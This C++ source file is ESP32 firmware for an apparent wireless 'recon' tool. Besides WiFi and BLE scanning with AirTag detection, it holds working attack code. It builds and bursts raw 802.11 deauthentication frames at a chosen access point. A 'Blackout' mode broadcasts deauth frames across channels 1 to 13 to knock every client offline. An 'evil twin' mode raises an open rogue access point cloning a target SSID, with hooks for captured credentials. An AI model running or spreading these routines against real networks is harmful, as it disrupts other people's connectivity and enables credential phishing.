#include "recon_service.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include <NimBLEDevice.h>

#define MAX_WIFI_RESULTS 30
#define MAX_BLE_RESULTS  30
#define DEAUTH_BURST_COUNT 10
#define DEAUTH_BURST_INTERVAL_MS 50

static ReconWiFi wifi_results[MAX_WIFI_RESULTS];
static int wifi_count = 0;

static BleDevice ble_results[MAX_BLE_RESULTS];
static int ble_count = 0;

static volatile bool flag_wifi_scan = false;
static volatile bool flag_ble_scan = false;
static volatile bool flag_deauth = false;
static volatile bool flag_deauth_all = false;
static volatile bool flag_sniffer = false;
static volatile bool flag_deauth_detect = false;
static volatile bool flag_evil_twin = false;
static volatile bool flag_stop = false;

static volatile int ble_scan_duration = 10;

static int sniffer_channel = 0;
static int sniffer_packets = 0;
static int deauth_detected_count = 0;
static bool sniffer_hopping = false;
static uint32_t sniffer_hop_time = 0;

static char et_ssid[33] = "";
static int et_channel = 6;
static char et_last_credential[256] = "";
static volatile bool et_new_cred = false;

static int blackout_current_ch = 1;
static uint32_t blackout_ch_time = 0;

static char deauth_bssid[18] = {0};
static int  deauth_channel = 1;

enum ReconState {
    RECON_IDLE,
    RECON_WIFI_SCANNING,
    RECON_BLE_SCANNING,
    RECON_DEAUTH_ACTIVE,
    RECON_DEAUTH_SENDING,
    RECON_DEAUTH_RESTORE,
    RECON_DEAUTH_ALL,
    RECON_SNIFFING,
    RECON_DEAUTH_DETECTING,
    RECON_EVIL_TWIN,
};
static ReconState state = RECON_IDLE;

static uint32_t deauth_last_burst_ms = 0;
static int deauth_frames_sent = 0;

static NimBLEScan* pBLEScan = nullptr;
static bool ble_scan_started = false;
static uint32_t ble_scan_start_ms = 0;
static int ble_scan_target_duration = 10;

static bool wifi_scan_requested = false;

static uint8_t deauth_frame[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x07, 0x00
};

static void parse_bssid(const char* str, uint8_t* out) {

    unsigned int b[6];
    if (sscanf(str, "%x:%x:%x:%x:%x:%x", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) == 6) {
        for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
    }
}

static const char* auth_type_str(wifi_auth_mode_t auth) {
    switch (auth) {
        case WIFI_AUTH_OPEN:            return "OPEN";
        case WIFI_AUTH_WEP:             return "WEP";
        case WIFI_AUTH_WPA_PSK:         return "WPA";
        case WIFI_AUTH_WPA2_PSK:        return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
        case WIFI_AUTH_WPA3_PSK:        return "WPA3";
        case WIFI_AUTH_WPA2_WPA3_PSK:   return "WPA2/3";
        case WIFI_AUTH_WAPI_PSK:        return "WAPI";
        default:                        return "OTHER";
    }
}

static bool check_is_airtag(const NimBLEAdvertisedDevice* dev) {
    if (!dev->haveManufacturerData()) return false;
    auto mfg = dev->getManufacturerData();
    if (mfg.size() < 3) return false;

    if ((uint8_t)mfg[0] == 0x4C && (uint8_t)mfg[1] == 0x00) {
        uint8_t type = (uint8_t)mfg[2];

        if (type == 0x12 || type == 0x07) return true;
    }
    return false;
}

class ReconBLECallbacks : public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice* dev) override {
        if (ble_count >= MAX_BLE_RESULTS) return;

        std::string addr_str = dev->getAddress().toString();
        const char* addr = addr_str.c_str();

        for (int i = 0; i < ble_count; i++) {
            if (strcmp(ble_results[i].mac, addr) == 0) return;
        }

        BleDevice& d = ble_results[ble_count];
        strncpy(d.mac, addr, sizeof(d.mac) - 1);
        d.mac[sizeof(d.mac) - 1] = '\0';

        if (dev->haveName()) {
            std::string nm = dev->getName();
            strncpy(d.name, nm.c_str(), sizeof(d.name) - 1);
            d.name[sizeof(d.name) - 1] = '\0';
        } else {
            d.name[0] = '\0';
        }

        d.rssi = dev->getRSSI();
        d.is_airtag = check_is_airtag(dev);

        ble_count++;

        Serial.printf("[RECON] BLE: %s \"%s\" RSSI:%d %s\n",
                      d.mac, d.name, d.rssi, d.is_airtag ? "[AIRTAG]" : "");
    }
};

static ReconBLECallbacks bleScanCB;

void recon_service_init(void) {
    Serial.println("[RECON] Service initialized");
}

void recon_request_wifi_scan(void) {
    flag_wifi_scan = true;
}

void recon_request_ble_scan(int duration_sec) {
    ble_scan_duration = duration_sec;
    flag_ble_scan = true;
}

void recon_request_deauth(const char* bssid, int channel) {
    strncpy(deauth_bssid, bssid, sizeof(deauth_bssid) - 1);
    deauth_bssid[sizeof(deauth_bssid) - 1] = '\0';
    deauth_channel = channel;
    flag_deauth = true;
}

void recon_request_stop(void) {
    flag_stop = true;
}

bool recon_is_scanning(void) {
    return state == RECON_WIFI_SCANNING || state == RECON_BLE_SCANNING;
}

bool recon_is_deauthing(void) {
    return state == RECON_DEAUTH_ACTIVE || state == RECON_DEAUTH_SENDING || state == RECON_DEAUTH_RESTORE;
}

int recon_wifi_count(void) {
    return wifi_count;
}

int recon_ble_count(void) {
    return ble_count;
}

const ReconWiFi* recon_get_wifi(int idx) {
    if (idx < 0 || idx >= wifi_count) return nullptr;
    return &wifi_results[idx];
}

const BleDevice* recon_get_ble(int idx) {
    if (idx < 0 || idx >= ble_count) return nullptr;
    return &ble_results[idx];
}

static void start_wifi_scan(void) {
    Serial.println("[RECON] Starting WiFi scan (AP_STA mode)");
    wifi_count = 0;

    WiFi.scanNetworks(true);
    wifi_scan_requested = true;
    state = RECON_WIFI_SCANNING;
}

static void poll_wifi_scan(void) {
    int16_t result = WiFi.scanComplete();
    if (result == WIFI_SCAN_RUNNING) return;

    if (result == WIFI_SCAN_FAILED) {
        Serial.println("[RECON] WiFi scan failed");
        state = RECON_IDLE;
        wifi_scan_requested = false;
        return;
    }

    int n = (result > MAX_WIFI_RESULTS) ? MAX_WIFI_RESULTS : result;
    for (int i = 0; i < n; i++) {
        ReconWiFi& net = wifi_results[i];
        strncpy(net.ssid, WiFi.SSID(i).c_str(), sizeof(net.ssid) - 1);
        net.ssid[sizeof(net.ssid) - 1] = '\0';
        snprintf(net.bssid, sizeof(net.bssid), "%s", WiFi.BSSIDstr(i).c_str());
        net.rssi = WiFi.RSSI(i);
        net.channel = WiFi.channel(i);
        strncpy(net.auth, auth_type_str(WiFi.encryptionType(i)), sizeof(net.auth) - 1);
        net.auth[sizeof(net.auth) - 1] = '\0';
        Serial.printf("[RECON] WiFi: ch%d %ddBm %-6s \"%s\" %s\n",
                      net.channel, net.rssi, net.auth, net.ssid, net.bssid);
    }
    wifi_count = n;
    WiFi.scanDelete();
    wifi_scan_requested = false;
    state = RECON_IDLE;
    Serial.printf("[RECON] WiFi scan complete: %d networks\n", wifi_count);
}

static void start_ble_scan(void) {
    Serial.println("[RECON] Starting BLE scan");
    ble_count = 0;

    if (!NimBLEDevice::isInitialized()) {
        NimBLEDevice::init("SCR-Scan");
    }

    pBLEScan = NimBLEDevice::getScan();
    pBLEScan->setScanCallbacks(&bleScanCB, false);
    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);

    ble_scan_target_duration = ble_scan_duration;

    pBLEScan->start(ble_scan_target_duration * 1000, false);
    ble_scan_started = true;
    ble_scan_start_ms = millis();
    state = RECON_BLE_SCANNING;
    Serial.printf("[RECON] BLE scan started (%ds = %dms)\n",
                  ble_scan_target_duration, ble_scan_target_duration * 1000);
}

static void poll_ble_scan(void) {
    if (!pBLEScan) {
        state = RECON_IDLE;
        return;
    }

    if (!pBLEScan->isScanning()) {
        ble_scan_started = false;
        state = RECON_IDLE;
        Serial.printf("[RECON] BLE scan complete: %d devices\n", ble_count);
    }
}

static void stop_ble_scan(void) {
    if (pBLEScan && pBLEScan->isScanning()) {
        pBLEScan->stop();
    }
    ble_scan_started = false;
}

static void start_deauth(void) {
    Serial.printf("[RECON] Starting deauth: BSSID=%s CH=%d\n", deauth_bssid, deauth_channel);

    uint8_t bssid_bytes[6];
    parse_bssid(deauth_bssid, bssid_bytes);
    memcpy(deauth_frame + 10, bssid_bytes, 6);
    memcpy(deauth_frame + 16, bssid_bytes, 6);

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);

    deauth_frames_sent = 0;
    deauth_last_burst_ms = 0;
    state = RECON_DEAUTH_SENDING;
}

static void poll_deauth(void) {
    uint32_t now = millis();
    if (now - deauth_last_burst_ms < DEAUTH_BURST_INTERVAL_MS) return;
    deauth_last_burst_ms = now;

    for (int i = 0; i < DEAUTH_BURST_COUNT; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    }
    deauth_frames_sent += DEAUTH_BURST_COUNT;

    if (deauth_frames_sent % 100 == 0) {
        Serial.printf("[RECON] Deauth: %d frames sent\n", deauth_frames_sent);
    }
}

static void stop_deauth_and_restore(void) {
    Serial.printf("[RECON] Deauth stopped after %d frames. Restoring AP...\n", deauth_frames_sent);

    esp_wifi_set_promiscuous(false);

    WiFi.mode(WIFI_AP_STA);
    WiFi.softAP("SCR Terminal", "pip12345");

    deauth_frames_sent = 0;
    state = RECON_IDLE;
    Serial.println("[RECON] AP restored");
}

static void IRAM_ATTR promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *frame = pkt->payload;
    uint8_t subtype = (frame[0] >> 4) & 0x0F;

    sniffer_packets++;

    if (subtype == 0x0C || subtype == 0x0A) {
        deauth_detected_count++;
    }
}

static void start_deauth_all(void) {
    Serial.println("[RECON] Blackout: deauth all channels");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    blackout_current_ch = 1;
    blackout_ch_time = millis();
    deauth_frames_sent = 0;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

    memset(deauth_frame + 4, 0xFF, 6);
    memset(deauth_frame + 10, 0xFF, 6);
    memset(deauth_frame + 16, 0xFF, 6);

    state = RECON_DEAUTH_ALL;
}

static void poll_deauth_all(void) {
    uint32_t now = millis();
    if (now - deauth_last_burst_ms < 30) return;
    deauth_last_burst_ms = now;

    for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    }
    deauth_frames_sent += 5;

    if (now - blackout_ch_time > 500) {
        blackout_current_ch++;
        if (blackout_current_ch > 13) blackout_current_ch = 1;
        esp_wifi_set_channel(blackout_current_ch, WIFI_SECOND_CHAN_NONE);
        blackout_ch_time = now;
    }
}

static void start_sniffer(int ch) {
    Serial.printf("[RECON] Sniffer starting CH=%d\n", ch);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    sniffer_packets = 0;
    deauth_detected_count = 0;
    sniffer_hopping = (ch == 0);
    sniffer_channel = (ch == 0) ? 1 : ch;
    esp_wifi_set_channel(sniffer_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_hop_time = millis();
    state = RECON_SNIFFING;
}

static void poll_sniffer(void) {
    if (!sniffer_hopping) return;

    if (millis() - sniffer_hop_time > 200) {
        sniffer_channel++;
        if (sniffer_channel > 13) sniffer_channel = 1;
        esp_wifi_set_channel(sniffer_channel, WIFI_SECOND_CHAN_NONE);
        sniffer_hop_time = millis();
    }
}

static void start_deauth_detect(void) {
    Serial.println("[RECON] Deauth detector starting");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    deauth_detected_count = 0;
    sniffer_packets = 0;
    sniffer_hopping = true;
    sniffer_channel = 1;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    sniffer_hop_time = millis();
    state = RECON_DEAUTH_DETECTING;
}

static void start_evil_twin(void) {
    Serial.printf("[RECON] Evil Twin: SSID=%s CH=%d\n", et_ssid, et_channel);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(et_ssid, NULL, et_channel);

    state = RECON_EVIL_TWIN;
    Serial.printf("[RECON] Rogue AP started: %s on CH%d\n", et_ssid, et_channel);
}

void recon_request_deauth_all(void) { flag_deauth_all = true; }
void recon_request_sniffer(int ch) { sniffer_channel = ch; flag_sniffer = true; }
void recon_request_deauth_detect(void) { flag_deauth_detect = true; }
void recon_request_evil_twin(const char* ssid, int ch) {
    strncpy(et_ssid, ssid, sizeof(et_ssid)-1);
    et_channel = ch;
    flag_evil_twin = true;
}

bool recon_is_sniffing(void) { return state == RECON_SNIFFING || state == RECON_DEAUTH_DETECTING; }
bool recon_is_evil_twin(void) { return state == RECON_EVIL_TWIN; }
int recon_sniffer_packet_count(void) { return sniffer_packets; }
int recon_deauth_detect_count(void) { return deauth_detected_count; }
const char* recon_et_last_cred(void) { return et_last_credential; }
bool recon_et_has_new_cred(void) { bool r = et_new_cred; et_new_cred = false; return r; }

void recon_service_loop(void) {

    if (flag_stop) {
        flag_stop = false;
        flag_wifi_scan = false;
        flag_ble_scan = false;
        flag_deauth = false;
        flag_deauth_all = false;
        flag_sniffer = false;
        flag_deauth_detect = false;
        flag_evil_twin = false;

        if (state == RECON_WIFI_SCANNING) {
            WiFi.scanDelete();
            wifi_scan_requested = false;
        } else if (state == RECON_BLE_SCANNING) {
            stop_ble_scan();
        } else if (state == RECON_DEAUTH_SENDING || state == RECON_DEAUTH_ACTIVE || state == RECON_DEAUTH_ALL) {
            stop_deauth_and_restore();
            return;
        } else if (state == RECON_SNIFFING || state == RECON_DEAUTH_DETECTING) {
            esp_wifi_set_promiscuous(false);
            stop_deauth_and_restore();
            return;
        } else if (state == RECON_EVIL_TWIN) {
            WiFi.softAPdisconnect(true);
            stop_deauth_and_restore();
            return;
        }
        state = RECON_IDLE;
        Serial.println("[RECON] Stopped");
        return;
    }

    if (state == RECON_IDLE) {
        if (flag_wifi_scan) {
            flag_wifi_scan = false;
            start_wifi_scan();
            return;
        }
        if (flag_ble_scan) {
            flag_ble_scan = false;
            start_ble_scan();
            return;
        }
        if (flag_deauth) {
            flag_deauth = false;
            start_deauth();
            return;
        }
        if (flag_deauth_all) {
            flag_deauth_all = false;
            start_deauth_all();
            return;
        }
        if (flag_sniffer) {
            flag_sniffer = false;
            start_sniffer(sniffer_channel);
            return;
        }
        if (flag_deauth_detect) {
            flag_deauth_detect = false;
            start_deauth_detect();
            return;
        }
        if (flag_evil_twin) {
            flag_evil_twin = false;
            start_evil_twin();
            return;
        }
    }

    switch (state) {
        case RECON_WIFI_SCANNING:
            poll_wifi_scan();
            break;
        case RECON_BLE_SCANNING:
            poll_ble_scan();
            break;
        case RECON_DEAUTH_SENDING:
            poll_deauth();
            break;
        case RECON_DEAUTH_ALL:
            poll_deauth_all();
            break;
        case RECON_SNIFFING:
            poll_sniffer();
            break;
        case RECON_DEAUTH_DETECTING:
            poll_sniffer();
            break;
        default:
            break;
    }
}
